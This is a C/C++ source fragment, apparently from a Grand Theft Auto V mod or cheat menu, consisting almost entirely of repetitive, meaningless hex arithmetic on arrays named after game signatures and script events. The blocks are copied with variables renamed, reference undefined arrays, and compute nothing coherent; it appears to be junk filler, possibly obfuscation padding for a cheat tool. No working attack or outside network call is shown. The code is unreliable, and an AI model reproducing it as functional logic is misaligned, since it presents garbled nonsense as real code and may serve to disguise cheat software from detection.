			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			Spawn.Model = Extern_Reader::INIFile::String::LerString(buffer, "Modelo");

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
